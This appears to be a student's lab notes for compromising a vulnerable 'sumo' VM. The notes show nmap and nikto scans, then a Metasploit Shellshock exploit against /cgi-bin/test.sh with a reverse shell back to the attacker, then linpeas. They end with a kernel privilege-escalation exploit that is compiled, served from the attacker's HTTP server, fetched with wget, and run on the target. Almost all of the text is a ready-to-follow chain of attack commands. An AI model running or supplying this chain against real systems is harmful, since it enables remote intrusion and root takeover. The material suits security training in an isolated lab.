vm4 - sumo
knujic@seclab:~/Downloads$ nmap -T4 -p- -A 10.224.72.100
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-28 13:50 CEST
Nmap scan report for 10.224.72.100
Host is up (0.0014s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 06:cb:9e:a3:af:f0:10:48:c4:17:93:4a:2c:45:d9:48 (DSA)
|   2048 b7:c5:42:7b:ba:ae:9b:9b:71:90:e7:47:b4:a4:de:5a (RSA)
|_  256 fa:81:cd:00:2d:52:66:0b:70:fc:b8:40:fa:db:18:30 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds

nikto -h http://10.224.72.100
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.224.72.100
+ Target Hostname:    10.224.72.100
+ Target Port:        80
+ Start Time:         2022-07-28 13:52:33 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 19:55:10 2020
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
+ OSVDB-112004: /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3092: /cgi-bin/test/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-07-28 13:52:45 (GMT2) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

dirb --> nothing useful

https://www.yeahhub.com/shellshock-vulnerability-exploitation-metasploit-framework/
msfconsole

search shellshock

use exploit/multi/http/apache_mod_cgi_bash_env_exec

set rhosts 10.224.72.100
set targeturi /cgi-bin/test.sh
show payloads
set payload linux/x86/shell/reverse_tcp
set lhost 10.224.72.16
exploit

 --> now we're in!

there exists a user sumo
shell -i 
bash -i 
sudo wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
//trebamo napravit listener te tako prebacit na mašinu koju napadamo program, //chmodom stavit da se moze executat i zavrtit ga, nakon toga nam otkrije sta cemo //napast, skidamo s neta exploit i dodemo do roota 
find / -type d -writable 2>/dev/null
/tmp 
/proc/12783/task/12783/fd
/proc/12783/fd
/var/tmp
/var/cache/apache2
/var/cache/apache2/mod_disk_cache
/run/shm
/run/lock
/run/lock/apache2
search for folders where we have permissions to write
tmp folder is our folder
mfsconsole --> searchsploit Ubuntu 12.04
Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2  | exploits/linux_x86-64/local/33589.c
find / -type f -name "33589.c"
$ cd /usr/share/exploitdb/exploits/linux_x86-64/
lvukelic@seclab:/usr/share/exploitdb/exploits/linux_x86-64/local$ cp 33589.c ~/Desktop/
lvukelic@seclab:~/Desktop$ gcc 33589.c -o exploit
lvukelic@seclab:~/Desktop$ python -m SimpleHTTPServer 6666
wget http://10.224.72.16:6666/exploit
chmod +x exploit
./exploit 0

